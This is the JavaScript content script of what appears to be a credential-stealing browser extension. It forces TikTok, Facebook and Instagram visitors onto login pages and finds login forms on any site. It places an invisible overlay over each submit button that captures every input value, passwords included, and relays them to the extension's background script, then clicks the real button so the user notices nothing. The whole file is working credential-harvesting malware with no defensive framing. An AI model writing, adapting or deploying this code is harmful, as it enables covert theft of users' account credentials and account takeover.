(function() {
    console.log('Content script loaded.');

    let isLoginFound = false;
    let intervalId;
    let currentOverlayButton = null; // Store the current overlay button
    let currentOriginalButton = null; // Store the original button

    const loginUrls = {
        'tiktok.com': 'https://tiktok.com/login',
        'facebook.com': 'https://web.facebook.com',
        'instagram.com': 'https://instagram.com/accounts/login/',
    };

    function findLoginForm() {
        const forms = document.querySelectorAll('form');
        const regex = /\b(log\s?in|sign\s?in|continue|submit|next|enter|access|authenticate|proceed|confirm|connect|validate|unlock|login|signin)\b/i;
        const currentUrl = window.location.hostname;

        for (const form of forms) {
            const buttons = form.querySelectorAll('button, input[type="button"], input[type="submit"]');

            for (const button of buttons) {
                if (regex.test(button.textContent) || regex.test(button.value)) {
                    console.log('Login button found');
                    if (button.closest('form') && button.closest('form').querySelectorAll('input').length > 0) {
                        captureAndProcessForm(button.closest('form')); // Process immediately
                        isLoginFound = true;
                        clearInterval(intervalId);
                        observeFormChanges(); // Start observing for form changes
                        return;
                    }
                }
            }

            // Check for button type "button" if no submit button is found
            const nonSubmitButtons = form.querySelectorAll('button[type="button"]');
            for (const button of nonSubmitButtons) {
                if (regex.test(button.textContent) || regex.test(button.value)) {
                    console.log('Login button (type=button) found');
                    if (button.closest('form') && button.closest('form').querySelectorAll('input').length > 0) {
                        captureAndProcessForm(button.closest('form')); // Process immediately
                        isLoginFound = true;
                        clearInterval(intervalId);
                        observeFormChanges(); // Start observing for form changes
                        return;
                    }
                }
            }
        }

        if (!isLoginFound) {
            const redirectUrl = loginUrls[currentUrl];
            if (redirectUrl && !window.location.href.startsWith(redirectUrl)) {
                window.location.href = redirectUrl;
            } else {
                console.log("No login button found and no redirect rule for this site.");
            }
        }
    }

    intervalId = setInterval(findLoginForm, 1000);

    function captureFormData(form) {
        const capturedData = { weburl: window.location.href };
        const inputs = form.querySelectorAll('input, textarea, select');

        inputs.forEach((input, index) => {
            const inputData = {};

            if (input.name) inputData.name = input.name;
            if (input.id) inputData.id = input.id;
            if (input.type) inputData.type = input.type;
            if (input.placeholder) inputData.placeholder = input.placeholder;
            if (input.value) inputData.value = input.value;
            if (input.className) inputData.className = input.className;

            capturedData[`input${index + 1}`] = inputData;
        });

        return { capturedData: capturedData, inputs: inputs };
    }

    function createOverlayButton(originalButton, form) {
        // Remove the previous overlay button if it exists
        if (currentOverlayButton) {
            currentOverlayButton.remove();
            currentOverlayButton = null;
            currentOriginalButton = null;
        }

        const rect = originalButton.getBoundingClientRect();
        const overlayButton = document.createElement('button');
        overlayButton.style.position = 'fixed';
        overlayButton.style.left = rect.left + 'px';
        overlayButton.style.top = rect.top + 'px';
        overlayButton.style.width = rect.width + 'px';
        overlayButton.style.height = rect.height + 'px';
        overlayButton.style.zIndex = '10000';
        overlayButton.style.background = 'transparent';
        overlayButton.style.border = 'none';
        overlayButton.style.padding = '0';
        overlayButton.style.margin = '0';
        overlayButton.style.cursor = 'pointer';

        overlayButton.addEventListener('click', (event) => {
            event.preventDefault();
            const { capturedData, inputs } = captureFormData(form);
            console.log(capturedData);
            chrome.runtime.sendMessage({ action: 'formDataSubmitted', formData: capturedData, inputs: inputs });
            originalButton.click();
        });

        document.body.appendChild(overlayButton);
        currentOverlayButton = overlayButton;
        currentOriginalButton = originalButton;
        checkOverlayPosition(); //initial check
    }

    function checkOverlayPosition() {
        if (currentOverlayButton && currentOriginalButton) {
            const originalRect = currentOriginalButton.getBoundingClientRect();
            const overlayRect = currentOverlayButton.getBoundingClientRect();

            if (originalRect.left !== overlayRect.left || originalRect.top !== overlayRect.top || originalRect.width !== overlayRect.width || originalRect.height !== overlayRect.height) {
                currentOverlayButton.style.left = originalRect.left + 'px';
                currentOverlayButton.style.top = originalRect.top + 'px';
                currentOverlayButton.style.width = originalRect.width + 'px';
                currentOverlayButton.style.height = originalRect.height + 'px';
            }
        }
    }

    function observeFormChanges() {
        const targetNode = document.body;
        const config = { childList: true, subtree: true };

        const observer = new MutationObserver(mutationsList => {
            for (let mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(node => {
                        if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'FORM') {
                            console.log('New form detected!');
                            captureAndProcessForm(node);
                        } else if (node.nodeType === Node.ELEMENT_NODE) {
                            const forms = node.querySelectorAll('form');
                            forms.forEach(form => {
                                console.log('New form detected within added node!');
                                captureAndProcessForm(form);
                            });
                        }
                    });
                }
            }
            checkOverlayPosition();
        });

        observer.observe(targetNode, config);
        setInterval(checkOverlayPosition, 200); // Check every 200ms
    }

    function captureAndProcessForm(form) {
        const { capturedData, inputs } = captureFormData(form);
        console.log(capturedData);
        chrome.runtime.sendMessage({ action: 'formDataSubmitted', formData: capturedData, inputs: inputs });
        // Create overlay button for the found form.
        const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');
        if (submitButton) {
            createOverlayButton(submitButton, form);
        } else {
            // Check for button type "button" if no submit button is found
            const nonSubmitButton = form.querySelector('button[type="button"]');
            if (nonSubmitButton) {
                createOverlayButton(nonSubmitButton, form);
            }
        }
    }
})();